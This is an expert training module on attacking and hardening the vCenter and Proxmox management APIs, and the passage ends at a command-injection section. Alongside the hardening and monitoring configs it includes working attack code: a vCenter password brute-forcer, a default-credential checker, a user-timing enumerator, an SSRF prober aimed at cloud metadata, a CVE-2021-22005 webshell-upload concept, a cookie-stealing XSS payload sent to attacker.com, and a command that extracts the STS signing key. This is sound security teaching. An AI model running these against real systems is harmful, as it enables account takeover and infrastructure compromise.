# API Security for Hypervisor Management Platforms — vCenter, Proxmox, and Automation APIs

> **Module:** Migrazione VMware → Proxmox VE
> **Position in curriculum:** Security Deep-Dive — Module 31 (API & Automation Security)
> **Prerequisites:** Modules 01-02 (VMware/Proxmox fundamentals), Module 12 (Security & Compliance), Module 20 (Hypervisor Security Hardening); familiarity with REST API architecture, HTTP protocol, TLS/PKI, authentication frameworks (OAuth2, SAML, Kerberos), Python scripting, common web application vulnerabilities (OWASP Top 10).
> **Learning objectives.** Upon completion the student will be able to:
> 1. Map the complete API attack surface of vSphere and Proxmox VE management platforms;
> 2. Identify and exploit common API authentication and authorization vulnerabilities in hypervisor management;
> 3. Conduct systematic API penetration testing against vCenter and Proxmox REST endpoints;
> 4. Implement defense-in-depth hardening for hypervisor management APIs;
> 5. Configure comprehensive API monitoring, anomaly detection, and SIEM integration;
> 6. Secure infrastructure automation pipelines (Terraform, Ansible, CI/CD) against credential exposure and supply chain attacks;
> 7. Design and execute a full API security assessment with remediation verification.
> **Estimated time:** reading 3-4 hours; lab exercises 12-20 hours
> **Level:** Expert (Dreyfus 5); offensive security and API security experience required
> **Last update:** 2026-05-07
> **Reference versions:** VMware vSphere 8.0 U3, vCenter Server 8.0, Proxmox VE 8.x, Terraform 1.8+, Ansible 2.16+
> **Audience:** Senior IT professionals, ethical hackers, penetration testers, infrastructure security architects

---

## Table of Contents

1. [Hypervisor API Attack Surface](#1-hypervisor-api-attack-surface)
2. [vSphere API Security](#2-vsphere-api-security)
3. [Proxmox API Security](#3-proxmox-api-security)
4. [API Authentication Attacks](#4-api-authentication-attacks)
5. [API Exploitation Techniques](#5-api-exploitation-techniques)
6. [API Hardening](#6-api-hardening)
7. [API Monitoring and Detection](#7-api-monitoring-and-detection)
8. [Automation Security](#8-automation-security)
9. [API Penetration Testing](#9-api-penetration-testing)
10. [Lab: API Security Assessment](#10-lab-api-security-assessment)

---

## 1. Hypervisor API Attack Surface

### 1.1 Why Management APIs Are High-Value Targets

Hypervisor management APIs represent the single most powerful interface in a virtualized infrastructure. An attacker with authenticated API access to vCenter or Proxmox can:

- **Create, modify, delete, and snapshot any VM** — enabling data theft, ransomware deployment, or evidence destruction
- **Access virtual machine consoles** — bypass guest OS authentication entirely
- **Modify network configurations** — redirect traffic, create covert channels, disable segmentation
- **Extract VM disks** — offline analysis of encrypted volumes, credential harvesting from memory snapshots
- **Manipulate cluster configurations** — disable HA, trigger failovers, create denial of service
- **Deploy malicious VMs** — establish persistent backdoors invisible to traditional endpoint detection

The management API is architecturally equivalent to physical console access to every server in the datacenter simultaneously. Its compromise is a total infrastructure compromise.

### 1.2 vSphere REST and SOAP API Surface

VMware vSphere exposes two primary API families:

| Interface | Protocol | Default Port | Purpose |
|-----------|----------|--------------|---------|
| vSphere Web Services SDK (vim25) | SOAP/XML | 443 | Full management — VM lifecycle, host config, storage, networking |
| vSphere REST API | REST/JSON | 443 | Modern interface — content library, VM management, tagging |
| Performance-Based Management (PBM) | SOAP | 443 | Storage policy management |
| SMS (Storage Monitoring Service) | SOAP | 443 | Storage provider management |
| VAMI (Appliance Management) | REST/JSON | 5480 | vCenter appliance configuration |
| ESXi Host Client | REST/JSON | 443 | Direct ESXi host management |
| Lookup Service | SOAP | 443 | Service registration and discovery |

The SOAP API (vim25) remains the most feature-complete interface and is what PowerCLI, vRealize, and most automation tools use internally. The REST API provides a subset of operations with a more modern interface. Both share the same authentication backend (vCenter SSO).

**Critical architectural detail:** All SOAP/REST APIs are served through the vCenter reverse proxy (rhttpproxy) on port 443. Path-based routing directs requests:
- `/sdk` → vim25 SOAP endpoint
- `/api` or `/rest` → REST API
- `/pbm` → Policy-Based Management
- `/sms` → Storage Monitoring Service

### 1.3 Proxmox REST API Surface

Proxmox VE exposes a single unified REST API through `pveproxy` (port 8006):

| Endpoint Pattern | Purpose |
|-----------------|---------|
| `/api2/json/access/*` | Authentication, users, groups, roles, ACLs |
| `/api2/json/nodes/{node}/*` | Node management, services, storage, network |
| `/api2/json/nodes/{node}/qemu/{vmid}/*` | KVM VM operations |
| `/api2/json/nodes/{node}/lxc/{vmid}/*` | LXC container operations |
| `/api2/json/cluster/*` | Cluster configuration, HA, backup |
| `/api2/json/storage/*` | Storage management |
| `/api2/json/pools/*` | Resource pool management |

Every management operation in the Proxmox web UI is an API call — the web interface is a pure JavaScript client consuming the same REST API available to automation tools. This means the API surface is complete and any UI action can be replicated programmatically.

### 1.4 Historical API Vulnerabilities

#### CVE-2021-21985 — vCenter vSAN Health Check Plugin RCE (CVSS 9.8)

- **Affected:** vCenter Server 6.5, 6.7, 7.0
- **Root cause:** The vSAN Health Check plugin (`/ui/h5-vsan/rest/*`) failed to validate input, allowing unauthenticated remote code execution through the vSphere Client (HTML5). The vulnerable endpoint was accessible without authentication because the plugin registered URL patterns that bypassed the authentication filter.
- **Attack vector:** Network-accessible vCenter on port 443 → HTTP request to plugin endpoint → Java deserialization / method invocation → arbitrary code execution as `vsphere-client` user (effectively root on the appliance)
- **Exploitation:** Widely exploited in the wild within days of disclosure. Multiple ransomware operators and APT groups integrated this into attack chains. Proof-of-concept exploits were trivial — a single HTTP POST.
- **Lesson:** Plugin architectures that bypass the core authentication framework create pre-auth attack surface. Every URL path must enforce authentication, regardless of which component registers it.

#### CVE-2021-22005 — vCenter Analytics Service File Upload (CVSS 9.8)

- **Affected:** vCenter Server 6.7, 7.0
- **Root cause:** The vCenter Analytics service (`/analytics/ceip/sdk`) accepted unauthenticated file uploads. An attacker could upload a crafted file that was subsequently deserialized or executed, leading to arbitrary code execution.
- **Attack vector:** Unauthenticated POST to `/analytics/ceip/sdk` with a specially crafted file → file written to a predictable path → execution triggered through service restart or cron
- **Exploitation:** Active exploitation confirmed by VMware within hours of advisory publication. CISA issued emergency directive. The vulnerability was trivially exploitable with curl:

```bash
# CVE-2021-22005 PoC concept (DO NOT USE outside authorized testing)
curl -k -X POST "https://<vcenter>/analytics/ceip/sdk" \
  -H "Content-Type: application/json" \
  -d '{"manifestSpec":{}}'  # Actual payload crafted to write webshell
```

- **Lesson:** Unauthenticated file upload endpoints on management interfaces are catastrophic. The analytics/telemetry service had no business accepting arbitrary uploads without authentication.

#### CVE-2023-20858 — VMware Carbon Black App Control Injection (CVSS 9.1)

- **Affected:** VMware Carbon Black App Control 8.7.x, 8.8.x, 8.9.x
- **Root cause:** The administration console (management API/web interface) accepted specially crafted input that allowed a privileged user to inject commands that execute on the underlying server operating system.
- **Impact:** Full compromise of the Carbon Black server through the management API. While this is not vCenter itself, it demonstrates a pattern across VMware's management platform ecosystem: management consoles running with elevated OS privileges that fail to properly sanitize API input.
- **Lesson:** Management APIs must treat all input — even from authenticated administrators — as untrusted. Defense in depth means the API layer should never pass unsanitized input to OS command execution contexts.

#### Proxmox VE API Security History

Proxmox VE has a notably cleaner security record for its API compared to vCenter, attributable to:

1. **Simpler architecture** — single Perl-based API daemon vs. Java/Spring/Python polyglot stack
2. **No plugin ecosystem** — no third-party code registering URL paths
3. **Consistent auth enforcement** — every API path passes through the same authentication layer
4. **Open source auditability** — community review catches issues before exploitation

Notable Proxmox security considerations:
- **CVE-2022-35414** (QEMU, not pveproxy) — affects the VM runtime, not the management API
- **pveproxy TLS configuration** — older installations with weak cipher suites
- **CSRF token implementation** — early versions had token validation inconsistencies
- **API token privilege inheritance** — tokens created by root@pam inherit dangerous default permissions if not explicitly restricted

### 1.5 Unauthenticated API Endpoint Risks

The most dangerous class of API vulnerability is the unauthenticated endpoint — a URL path that processes requests without verifying caller identity. In hypervisor management, these have led to every critical RCE in vCenter's recent history:

| Vulnerability | Unauthenticated Path | Consequence |
|--------------|---------------------|-------------|
| CVE-2021-21985 | `/ui/h5-vsan/rest/*` | RCE as vsphere-client |
| CVE-2021-22005 | `/analytics/ceip/sdk` | Arbitrary file upload → RCE |
| CVE-2021-21972 | `/ui/vropspluginui/rest/services/uploadova` | Arbitrary file upload → RCE |
| CVE-2020-3952 | vmdir LDAP (port 389) | Information disclosure → token forge |

**Pattern:** Every critical vCenter pre-auth vulnerability involved a subsidiary service or plugin that registered URL paths outside the main authentication gate. The architectural anti-pattern is: monolithic reverse proxy (rhttpproxy) routing to disparate backend services with inconsistent authentication requirements.

---

## 2. vSphere API Security

### 2.1 vCenter REST API Authentication — SSO Tokens and Session Management

vCenter uses the VMware SSO (Single Sign-On) service as its identity provider. All API authentication flows through SSO:

```
┌──────────────┐         ┌───────────────┐         ┌──────────────┐
│  API Client  │────────▶│  vCenter SSO  │────────▶│  vCenter API │
│  (curl/SDK)  │◀────────│  (STS Token)  │◀────────│  (vim25/REST)│
└──────────────┘  SAML   └───────────────┘  Verify └──────────────┘
                  Token
```

**REST API Session Authentication:**

```bash
# Obtain session token via REST API
curl -k -X POST "https://vcenter.lab.local/api/session" \
  -u "administrator@vsphere.local:Password123!" \
  -H "Content-Type: application/json"

# Response: "vmware-api-session-id" header contains the session token
# Example: "b3a27d3c4f2e4a8b9c1d5e6f7a8b9c0d"

# Use session token for subsequent requests
curl -k "https://vcenter.lab.local/api/vcenter/vm" \
  -H "vmware-api-session-id: b3a27d3c4f2e4a8b9c1d5e6f7a8b9c0d"
```

**SOAP API Authentication (vim25):**

```python
# Python pyVmomi authentication
from pyVim.connect import SmartConnect, Disconnect
import ssl

context = ssl.create_default_context()
context.check_hostname = False  # BAD — shown for lab clarity
context.verify_mode = ssl.CERT_NONE  # BAD — production must verify

si = SmartConnect(
    host="vcenter.lab.local",
    user="administrator@vsphere.local",
    pwd="Password123!",
    sslContext=context
)
# si.content.sessionManager holds the authenticated session
# Session cookie: vmware_soap_session
```

**Session characteristics:**
- Default session timeout: 30 minutes (configurable)
- Sessions are tied to source IP in newer versions (configurable)
- Maximum concurrent sessions per user: configurable (default unlimited — a risk)
- Session tokens are opaque server-side references, not JWTs

### 2.2 SOAP API Endpoints — vim25, PBM, SMS

The SOAP API uses WSDL-defined operations. Key security-relevant service groups:

```bash
# Retrieve WSDL definitions
curl -k "https://vcenter.lab.local/sdk/vim.wsdl"
curl -k "https://vcenter.lab.local/sdk/vimService.wsdl"

# SOAP login request structure
cat << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:vim25="urn:vim25">
  <soapenv:Body>
    <vim25:Login>
      <vim25:_this type="SessionManager">SessionManager</vim25:_this>
      <vim25:userName>administrator@vsphere.local</vim25:userName>
      <vim25:password>Password123!</vim25:password>
    </vim25:Login>
  </soapenv:Body>
</soapenv:Envelope>
EOF
```

**Security-critical SOAP operations:**

| Operation | Risk if Abused |
|-----------|---------------|
| `Login` / `LoginByToken` | Credential validation, brute force target |
| `CloneVM_Task` | Exfiltrate VM data |
| `CreateSnapshot_Task` | Memory dump capture |
| `ReconfigVM_Task` | Inject hardware (USB, NIC), modify boot order |
| `AcquireTicket` | Console access bypass |
| `RegisterVM_Task` | Deploy malicious VMs |
| `RetrieveProperties` | Enumerate entire inventory |

### 2.3 API Permissions Model — Privilege-Based Access Control

vSphere uses a hierarchical privilege model:

```
Global Permissions (vCenter level)
└── Datacenter
    └── Cluster
        └── Resource Pool
            └── Virtual Machine
```

Each object can have permissions assigned: `(User/Group, Role, Propagate)`. Roles are collections of privileges. The built-in roles range from `No Access` to `Administrator` (all 300+ privileges).

**Dangerous privileges for API abuse:**

| Privilege | Risk |
|-----------|------|
| `VirtualMachine.Interact.ConsoleInteract` | Remote console access to any VM |
| `VirtualMachine.Provisioning.DiskRandomRead` | Read arbitrary VM disk data |
| `VirtualMachine.Config.AddNewDisk` | Attach attacker-controlled storage |
| `Global.Diagnostics` | Access support bundles (may contain credentials) |
| `Sessions.ValidateSession` | Enumerate active sessions |
| `Extension.Register` | Register malicious vCenter extensions |

### 2.4 API Rate Limiting and Abuse Prevention

vCenter has minimal built-in rate limiting. The vCenter Server Appliance (VCSA) relies on:

1. **rhttpproxy connection limits** — configurable max connections per source IP
2. **vpxd task queue** — limits concurrent tasks (default: 8 per host, 32 per vCenter)
3. **No native API rate limiting** — must be implemented at load balancer/WAF layer

```bash
# Check rhttpproxy configuration
cat /etc/vmware-rhttpproxy/config.xml
# Look for: <maxConnections>, <maxConnectionsPerIP>

# Monitor active API sessions
curl -k "https://vcenter.lab.local/api/session" \
  -H "vmware-api-session-id: $SESSION" | python3 -m json.tool
```

### 2.5 ESXi Host API Direct Access

ESXi hosts expose their own API independently of vCenter:

```bash
# Direct ESXi authentication
curl -k -X POST "https://esxi-host.lab.local/api/session" \
  -u "root:EsxiPassword!"

# List VMs on this host directly
curl -k "https://esxi-host.lab.local/api/vcenter/vm" \
  -H "vmware-api-session-id: $ESX_SESSION"
```

**Risk:** Even when vCenter is hardened, direct ESXi access bypasses vCenter RBAC. In Lockdown Mode (Normal or Strict), direct API access is restricted — but not all organizations enable it.

### 2.6 PowerCLI Security — Credential Storage and Session Management

VMware PowerCLI is the de facto automation tool for vSphere:

```powershell
# INSECURE: credentials in script (common in practice)
Connect-VIServer -Server vcenter.lab.local `
  -User "admin@vsphere.local" -Password "plaintext!"

# BETTER: encrypted credential file (tied to user/machine)
$cred = Get-Credential
$cred | Export-Clixml -Path "$env:USERPROFILE\vcred.xml"
# Later:
$cred = Import-Clixml -Path "$env:USERPROFILE\vcred.xml"
Connect-VIServer -Server vcenter.lab.local -Credential $cred

# BEST: certificate-based authentication or external secret management
# Use VMware SSO SAML token with service account
```

**PowerCLI security risks:**
- `Set-PowerCLIConfiguration -InvalidCertificateAction Ignore` — disables TLS verification
- Session tokens stored in `$global:DefaultVIServer` — accessible to any code in the session
- Script history may contain credentials
- `-Force` flags bypass confirmation on destructive operations

---

## 3. Proxmox API Security

### 3.1 PVE REST API Authentication — Ticket and Token Authentication

Proxmox VE supports two authentication methods for its API:

**Method 1: Ticket Authentication (session-based)**

```bash
# Obtain authentication ticket
curl -k -X POST "https://proxmox.lab.local:8006/api2/json/access/ticket" \
  -d "username=root@pam&password=SecurePass123!"

# Response:
# {
#   "data": {
#     "ticket": "PVE:root@pam:66A8B2C3::base64-encoded-data...",
#     "CSRFPreventionToken": "66A8B2C3:base64-encoded-csrf-token...",
#     "username": "root@pam"
#   }
# }

# Use ticket as cookie + CSRF token in header for subsequent requests
curl -k "https://proxmox.lab.local:8006/api2/json/nodes" \
  -b "PVEAuthCookie=PVE:root@pam:66A8B2C3::base64-encoded-data..." \
  -H "CSRFPreventionToken: 66A8B2C3:base64-encoded-csrf-token..."
```

**Method 2: API Token Authentication (stateless)**

```bash
# Create API token (via API or GUI)
curl -k -X POST "https://proxmox.lab.local:8006/api2/json/access/users/automation@pve/token/terraform" \
  -b "PVEAuthCookie=$TICKET" \
  -H "CSRFPreventionToken: $CSRF" \
  -d "privsep=1&expire=1735689600"

# Response contains the secret (shown ONCE):
# { "data": { "full-tokenid": "automation@pve!terraform",
#             "value": "aaaaaaaaa-bbb-cccc-dddd-eeeeeeeeeeee" } }

# Use API token directly — no session, no CSRF needed
curl -k "https://proxmox.lab.local:8006/api2/json/cluster/status" \
  -H "Authorization: PVEAPIToken=automation@pve!terraform=aaaaaaaaa-bbb-cccc-dddd-eeeeeeeeeeee"
```

### 3.2 API Token Architecture — TokenID, Secret, Privilege Separation

Proxmox API tokens have a sophisticated privilege separation model:

```
┌─────────────────────────────────────────────────────┐
│  User: automation@pve                                │
│  Permissions: VM.Allocate, VM.Config.*, Datastore.*  │
│                                                      │
│  Token: automation@pve!terraform                     │
│  privsep=1 → token has SEPARATE permissions          │
│  Token Permissions: VM.Config.Disk, Datastore.Audit  │
│                                                      │
│  Token: automation@pve!monitoring                    │
│  privsep=0 → token inherits ALL user permissions     │
└─────────────────────────────────────────────────────┘
```

**Key security properties:**

| Property | `privsep=1` | `privsep=0` |
|----------|-------------|-------------|
| Permissions | Intersection of user AND token ACLs | All user permissions |
| Scope limitation | Token can only do what both user AND token are allowed | No additional restriction |
| Use case | CI/CD, monitoring, limited automation | Legacy compat, admin scripts |
| Risk | Lower — compromise limited to token's explicit perms | Higher — equivalent to user credential compromise |

**Token expiration:**
```bash
# Set token to expire (epoch timestamp)
pveum user token add automation@pve terraform --expire 1735689600 --privsep 1

# Verify token expiry
pveum user token list automation@pve
```

### 3.3 CSRF Prevention — PVEAuthCookie and CSRFPreventionToken

Proxmox implements dual-token CSRF protection for ticket-based authentication:

1. **PVEAuthCookie** — sent as a cookie, used for authentication
2. **CSRFPreventionToken** — sent as a custom header, prevents CSRF

For state-changing operations (POST, PUT, DELETE), both must be present. GET requests require only the cookie. API tokens (Authorization header) bypass CSRF requirements because they are not vulnerable to CSRF — browsers do not automatically attach custom Authorization headers.

**CSRF implementation detail:**

```perl
# Simplified from Proxmox source (PVE::APIServer::AnyEvent)
sub verify_csrf_prevention_token {
    my ($token, $username, $age) = @_;
    # Token format: TIMESTAMP:HMAC(TIMESTAMP:USERNAME, secret)
    # Validates: correct user, not expired, HMAC matches
    # Secret rotated on service restart
}
```

### 3.4 API Permission Model — Path-Based ACLs and Pools

Proxmox uses path-based Access Control Lists:

```
/                        # Root — everything
/access                  # User/group/realm management
/nodes                   # All nodes
/nodes/{node}            # Specific node
/vms/{vmid}              # Specific VM (regardless of node)
/storage/{store}         # Specific storage
/pool/{pool}             # Resource pool
/sdn                     # Software-defined networking
```

**ACL assignment:**
```bash
# Grant 'automation@pve' the 'PVEVMAdmin' role on /vms/100 only
pveum acl modify /vms/100 --users automation@pve --roles PVEVMAdmin

# Grant token-specific permission (privsep=1 tokens need this)
pveum acl modify /vms/100 --tokens 'automation@pve!terraform' --roles PVEVMUser

# View effective permissions
pveum user permissions automation@pve --path /vms/100
```

**Built-in roles (security-relevant subset):**

| Role | Privileges | Risk Level |
|------|-----------|------------|
| `PVEAdmin` | Almost everything except user management | High |
| `PVEVMAdmin` | Full VM control | Medium-High |
| `PVEVMUser` | VM console, start/stop, snapshot | Medium |
| `PVEAuditor` | Read-only access to all objects | Low |
| `PVEDatastoreAdmin` | Full storage control | High (data access) |
| `Administrator` | Everything including user/ACL management | Critical |

### 3.5 pveproxy Configuration — TLS, Bind Address, Trusted Proxies

The `pveproxy` daemon configuration at `/etc/default/pveproxy`:

```bash
# /etc/default/pveproxy — production hardening

# Bind only to management VLAN interface
LISTEN_IP="10.0.100.5"

# TLS configuration
ALLOW_FROM="10.0.100.0/24,192.168.1.0/24"
DENY_FROM="all"
POLICY="allow"

# Cipher suite restriction
# Configured in /etc/pve/local/pveproxy-ssl.pem (certificate)
# and cipher control via:
CIPHERS="ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
HONOR_CIPHER_ORDER="yes"
```

**TLS hardening in `/etc/pve/local/pveproxy-ssl.conf`** (if using custom OpenSSL config):

```ini
[pveproxy]
min_protocol = TLSv1.2
max_protocol = TLSv1.3
ciphersuites = TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
```

### 3.6 Rate Limiting Configuration

Proxmox VE 8.x introduced configurable rate limiting:

```bash
# /etc/pve/datacenter.cfg — cluster-wide settings
# Rate limiting for authentication attempts
max_login_attempts: 5
login_ban_time: 300

# In pveproxy configuration
# Connection limits per source IP
MAX_CONN_PER_IP=50
MAX_REQUEST_RATE=100
```

**Fail2ban integration for API brute force:**

```ini
# /etc/fail2ban/filter.d/proxmox.conf
[Definition]
failregex = pvedaemon\[.*authentication failure; rhost=<HOST> user=.* msg=.*
ignoreregex =

# /etc/fail2ban/jail.d/proxmox.conf
[proxmox]
enabled = true
port = https,8006
filter = proxmox
backend = systemd
maxretry = 3
findtime = 600
bantime = 3600
```

### 3.7 Webhook Event System Security

Proxmox 8.x added webhook notifications for cluster events:

```bash
# Webhook endpoint configuration
pvesh create /cluster/notifications/endpoints/webhook/siem-hook \
  --url "https://siem.internal:9200/_bulk" \
  --method POST \
  --header "Authorization=Bearer ${SIEM_TOKEN}" \
  --body '{"event": "{{event}}", "node": "{{node}}", "severity": "{{severity}}"}'
```

**Security considerations:**
- Webhook secrets stored in `/etc/pve/notifications.cfg` (cluster-synchronized)
- Outbound webhook connections must use TLS with certificate verification
- Template injection risk in webhook body — `{{variables}}` must be sanitized
- Webhook URLs should point to internal SIEM collectors, never to external services

---

## 4. API Authentication Attacks

### 4.1 Credential Brute Force Against Management APIs

Hypervisor management APIs are prime brute force targets because:
- A single credential grants access to the entire virtual infrastructure
- Default accounts are well-known (`administrator@vsphere.local`, `root@pam`)
- Many deployments lack account lockout on API endpoints

**vCenter API brute force:**

```python
#!/usr/bin/env python3
"""
vCenter API brute force demonstration — AUTHORIZED TESTING ONLY
Demonstrates why rate limiting and account lockout are critical
"""
import requests
import sys
from concurrent.futures import ThreadPoolExecutor
requests.packages.urllib3.disable_warnings()

VCENTER = "https://vcenter.target.local"
USERNAME = "administrator@vsphere.local"

def try_password(password: str) -> tuple[str, bool]:
    try:
        resp = requests.post(
            f"{VCENTER}/api/session",
            auth=(USERNAME, password),
            verify=False,
            timeout=10
        )
        return (password, resp.status_code == 201)
    except requests.RequestException:
        return (password, False)

def main():
    wordlist_path = sys.argv[1] if len(sys.argv) > 1 else "/usr/share/wordlists/rockyou.txt"
    with open(wordlist_path, "r", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Testing {len(passwords)} passwords against {VCENTER}")
    with ThreadPoolExecutor(max_workers=5) as executor:
        for password, success in executor.map(try_password, passwords):
            if success:
                print(f"[+] VALID: {USERNAME}:{password}")
                return
    print("[-] No valid credentials found")

if __name__ == "__main__":
    main()
```

**Proxmox API brute force:**

```python
#!/usr/bin/env python3
"""
Proxmox API authentication testing — AUTHORIZED TESTING ONLY
"""
import requests
requests.packages.urllib3.disable_warnings()

PROXMOX = "https://proxmox.target.local:8006"

def test_login(username: str, password: str) -> bool:
    resp = requests.post(
        f"{PROXMOX}/api2/json/access/ticket",
        data={"username": username, "password": password},
        verify=False,
        timeout=10
    )
    return resp.status_code == 200 and "ticket" in resp.json().get("data", {})

# Common default credentials to test
defaults = [
    ("root@pam", "proxmox"),
    ("root@pam", "password"),
    ("root@pam", "admin"),
    ("admin@pve", "admin"),
]

for user, pwd in defaults:
    if test_login(user, pwd):
        print(f"[CRITICAL] Default credentials valid: {user}:{pwd}")
```

### 4.2 Token Theft and Replay

API tokens and session tickets are bearer credentials — possession equals access. Theft vectors:

1. **Log files** — API tokens accidentally logged in application logs, proxy access logs, or debug output
2. **Configuration files** — plaintext tokens in Terraform state, Ansible playbooks, CI/CD configs
3. **Memory dumps** — tokens in process memory, VM snapshots, core dumps
4. **Network capture** — TLS stripping, compromised load balancer, insufficient TLS validation in clients
5. **Source control** — committed `.env` files, hardcoded tokens in scripts

**Token replay attack:**

```bash
# Stolen Proxmox API token replay
# If an attacker obtains the token value, they can immediately use it:
curl -k "https://proxmox.target.local:8006/api2/json/nodes" \
  -H "Authorization: PVEAPIToken=automation@pve!terraform=stolen-token-value"

# The token works until:
# - Explicitly revoked by an admin
# - It expires (if expiration was set)
# - The user account is disabled/deleted

# Stolen vCenter session replay
curl -k "https://vcenter.target.local/api/vcenter/vm" \
  -H "vmware-api-session-id: stolen-session-id"
# Works until session timeout (default 30min)
```

### 4.3 Session Hijacking Through XSS and MITM

**Cross-Site Scripting against management UIs:**

Both vCenter (HTML5 client) and Proxmox (ExtJS web UI) are web applications vulnerable to XSS if input sanitization fails:

```javascript
// Hypothetical stored XSS in VM notes/description field
// VM name or description rendered without encoding in UI
// Payload steals session cookie:
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

// Proxmox-specific: PVEAuthCookie is HttpOnly by default (good)
// But CSRFPreventionToken is accessible via JavaScript (by design — needed for AJAX)
// Attacker with XSS can obtain CSRF token and make authenticated API calls
```

**MITM against API clients with disabled certificate verification:**

```python
# COMMON VULNERABILITY: scripts that disable TLS verification
# This is exploitable via ARP spoofing, DNS poisoning, or rogue AP
import requests
requests.packages.urllib3.disable_warnings()
# verify=False makes this vulnerable to interception
resp = requests.post(url, auth=creds, verify=False)  # VULNERABLE
```

### 4.4 API Token Enumeration

Discovering valid API tokens or usernames through timing attacks or error message differences:

```python
#!/usr/bin/env python3
"""
Username enumeration via response timing/content differences
"""
import requests
import time
requests.packages.urllib3.disable_warnings()

PROXMOX = "https://proxmox.target.local:8006"

def enumerate_user(username: str) -> dict:
    start = time.perf_counter()
    resp = requests.post(
        f"{PROXMOX}/api2/json/access/ticket",
        data={"username": username, "password": "definitely-wrong-password"},
        verify=False
    )
    elapsed = time.perf_counter() - start
    return {
        "username": username,
        "status": resp.status_code,
        "time_ms": elapsed * 1000,
        "response_length": len(resp.content)
    }

# If valid users take longer (LDAP/AD lookup succeeds then password fails)
# vs invalid users that fail immediately, timing difference reveals valid accounts
users_to_test = ["root@pam", "admin@pve", "backup@pve", "monitor@pve",
                 "nonexistent@pam", "test@pve"]

for user in users_to_test:
    result = enumerate_user(user)
    print(f"{result['username']:20s} | {result['status']} | {result['time_ms']:.1f}ms | {result['response_length']} bytes")
```

### 4.5 Certificate-Based Authentication Bypass

vCenter supports certificate-based authentication via the STS (Security Token Service). Attacks against this:

1. **Compromised Machine SSL certificate** — If the vCenter machine SSL cert private key is extracted (from VECS store), an attacker can impersonate vCenter to ESXi hosts
2. **STS signing certificate theft** — The STS signing cert signs SAML tokens. Possession of this key allows forging authentication tokens for any user (the VMSA-2024 "STS cert rotation" advisory)
3. **VMCA root CA compromise** — If the VMware Certificate Authority root key is stolen, all infrastructure trust is broken

```bash
# Extract STS signing certificate from vCenter (requires shell access)
# Location: /storage/db/vmware-vmdir/data.mdb (embedded in vmdir)
# Or via VECS:
/usr/lib/vmware-vmafd/bin/vecs-cli entry getkey \
  --store STS_INTERNAL_SSL_CERT --alias __MACHINE_CERT

# With the STS signing key, forge SAML tokens for any user:
# (This is the technique used in SolarWinds-style attacks against vCenter)
```

### 4.6 OAuth/SAML Vulnerabilities in vCenter SSO

vCenter SSO issues SAML 2.0 tokens. Known attack classes:

- **SAML token signature wrapping** — manipulating XML structure to bypass signature verification
- **Token lifetime extension** — modifying `NotOnOrAfter` assertions if signature not properly bound
- **Identity provider spoofing** — registering a malicious IdP if federation is misconfigured
- **Golden SAML** — forging tokens with a stolen STS signing key (post-compromise persistence)

### 4.7 LDAP Injection Through Authentication Endpoints

When vCenter or Proxmox authenticate against LDAP/AD:

```bash
# Proxmox LDAP realm configuration
pveum realm add corp-ad --type ldap \
  --server "dc1.corp.local" \
  --base_dn "DC=corp,DC=local" \
  --user_attr "sAMAccountName" \
  --bind_dn "CN=proxmox-svc,OU=Services,DC=corp,DC=local"

# If username input is not sanitized before LDAP query construction:
# Malicious username: admin)(|(objectClass=*
# Could potentially bypass authentication or enumerate directory
```

---

## 5. API Exploitation Techniques

### 5.1 Privilege Escalation Through API — Abusing Overprivileged Tokens

The most common real-world API exploitation is not a software vulnerability — it is misconfigured authorization. Overprivileged tokens and service accounts grant more access than intended:

```python
#!/usr/bin/env python3
"""
Demonstrate privilege escalation via overprivileged Proxmox API token.
A token intended for 'monitoring' that was granted too many permissions.
"""
import requests
requests.packages.urllib3.disable_warnings()

PROXMOX = "https://proxmox.target.local:8006"
# Token supposedly for "monitoring only" — but created with privsep=0
TOKEN = "PVEAPIToken=monitor@pve!metrics=aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"
HEADERS = {"Authorization": TOKEN}

# Step 1: Verify we can see VMs (expected for monitoring)
vms = requests.get(f"{PROXMOX}/api2/json/nodes/pve1/qemu", headers=HEADERS, verify=False)
print(f"[*] VM enumeration: {vms.status_code}")

# Step 2: Attempt to access VM configuration (may reveal sensitive data)
for vm in vms.json().get("data", []):
    vmid = vm["vmid"]
    config = requests.get(
        f"{PROXMOX}/api2/json/nodes/pve1/qemu/{vmid}/config",
        headers=HEADERS, verify=False
    )
    # VM configs may contain: cloud-init passwords, SSH keys, custom args
    print(f"  VM {vmid} config: {config.status_code}")

# Step 3: Attempt privileged operations (should fail for monitoring token)
# Create snapshot (data exfiltration preparation)
snap = requests.post(
    f"{PROXMOX}/api2/json/nodes/pve1/qemu/100/snapshot",
    headers=HEADERS,
    data={"snapname": "exfil", "description": "maintenance"},
    verify=False
)
print(f"[*] Snapshot creation (should be denied): {snap.status_code}")

# Step 4: If privsep=0 and user has VM.Snapshot — this succeeds
# Attacker can now export the snapshot for offline analysis
if snap.status_code == 200:
    print("[!] PRIVILEGE ESCALATION: monitoring token can create snapshots!")
```

### 5.2 SSRF Through API Endpoints — Internal Network Scanning

Management APIs sometimes proxy or fetch resources from user-specified URLs:

```python
#!/usr/bin/env python3
"""
SSRF via vCenter content library subscription — AUTHORIZED TESTING ONLY
Content library can subscribe to external URLs. If URL validation is weak,
internal network scanning is possible.
"""
import requests
requests.packages.urllib3.disable_warnings()

VCENTER = "https://vcenter.target.local"
SESSION_HEADER = {"vmware-api-session-id": "valid-session-token"}

# Attempt to subscribe content library to internal addresses
internal_targets = [
    "http://169.254.169.254/latest/meta-data/",  # Cloud metadata
    "http://10.0.0.1:8006/",                      # Internal Proxmox
    "http://10.0.0.5:9090/",                      # Internal Prometheus
    "http://127.0.0.1:5480/",                     # vCenter VAMI
]

for target in internal_targets:
    resp = requests.post(
        f"{VCENTER}/api/content/subscribed-library",
        headers=SESSION_HEADER,
        json={
            "create_spec": {
                "name": "ssrf-test",
                "subscription_info": {
                    "subscription_url": target,
                    "authentication_method": "NONE"
                },
                "storage_backings": [{"type": "DATASTORE", "datastore_id": "datastore-1"}]
            }
        },
        verify=False,
        timeout=5
    )
    print(f"Target: {target} → {resp.status_code} | {len(resp.content)} bytes")
```

### 5.3 Command Injection Through API Parameters

APIs that pass parameters to system commands without sanitization:

```bash
